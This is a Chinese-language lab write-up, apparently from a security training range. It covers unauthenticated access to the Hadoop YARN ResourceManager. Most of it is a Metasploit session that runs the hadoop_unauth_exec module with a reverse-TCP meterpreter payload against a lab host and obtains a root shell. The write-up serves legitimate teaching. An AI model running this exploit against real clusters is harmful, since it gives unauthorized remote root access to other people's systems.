# Hadoop YARN ResourceManager 未授权访问漏洞

> [English Documentation](README_EN.md)

| 属性 | 详情 |
|------|------|
| **漏洞名称** | Hadoop YARN ResourceManager 未授权访问漏洞 |
| **影响组件** | Apache Hadoop YARN ResourceManager |
| **漏洞类型** | 未授权访问 |
| **危险等级** | 🟠 中危 |
| **默认端口** | 8088 |

## 漏洞描述

`Hadoop` 作为一个分布式计算应用程序框架，种类功能繁多，各种组件安全问题会带来很大的攻击面。`Apache Hadoop YARN` 是 Hadoop 的核心组件之一，负责将资源分配在 `Hadoop` 集群中运行的各种应用程序，并调度要在不同集群节点上执行的任务（独立出的资源管理框架，负责资源管理和调度）。

## 漏洞复现

### 环境信息

- 靶机 IP：192.168.2.47
- Web 端口：8088

### 操作步骤

靶机启动后，访问 `http://your-ip:8088` 即可看到 `Hadoop YARN ResourceManager WebUI` 页面。

![](https://static.nextcyber.cn/attachments/images/course/task/070722bb4f0a4a8c8f7043c38c692e56.png)

## 漏洞利用

这里我们直接使用 `MSF` 进行漏洞利用获取 `shell`：

```bash
┌──(root㉿nextcyber)-[~]
└─# msfconsole -q
msf6 > search hadoop

Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/linux/http/hadoop_unauth_exec  2016-10-19       excellent  Yes    Hadoop YARN ResourceManager Unauthenticated Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/linux/http/hadoop_unauth_exec

msf6 > use 0
[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp
msf6 exploit(linux/http/hadoop_unauth_exec) > options

Module options (exploit/linux/http/hadoop_unauth_exec):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    8088             yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                   no        The URI to use for this exploit (default is random)
   VHOST                     no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.2.6      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


View the full module info with the info, or info -d command.

msf6 exploit(linux/http/hadoop_unauth_exec) > set rhosts 192.168.2.47
rhosts => 192.168.2.47
msf6 exploit(linux/http/hadoop_unauth_exec) > set lhost 192.168.2.6
lhost => 192.168.2.6
msf6 exploit(linux/http/hadoop_unauth_exec) > run

[*] Started reverse TCP handler on 192.168.2.6:4444 
[*] Sending Command
[*] Command Stager progress - 100.00% done (823/823 bytes)
[*] Sending stage (3045380 bytes) to 192.168.2.47
[*] Meterpreter session 1 opened (192.168.2.6:4444 -> 192.168.2.47:58249) at 2024-12-12 14:58:09 +0800

meterpreter > getuid
Server username: root
meterpreter > shell
Process 241 created.
Channel 1 created.
uname -a
Linux 8528ff3bc519 5.15.153.1-microsoft-standard-WSL2 #1 SMP Fri Mar 29 23:14:13 UTC 2024 x86_64 GNU/Linux
id
uid=0(root) gid=0(root) groups=0(root)
pwd
/tmp/hadoop-root/nm-local-dir/usercache/dr.who/appcache/application_1733986467657_0001/container_1733986467657_0001_01_000001
ls
container_tokens
default_container_executor.sh
default_container_executor_session.sh
launch_container.sh
tmp
```

漏洞利用成功，拿到了 **root** 用户的 shell。

---

## 靶场练习

前往 [NextCyber 靶场](https://app.nextcyber.cn/courses/85) 在线实战演练此漏洞。
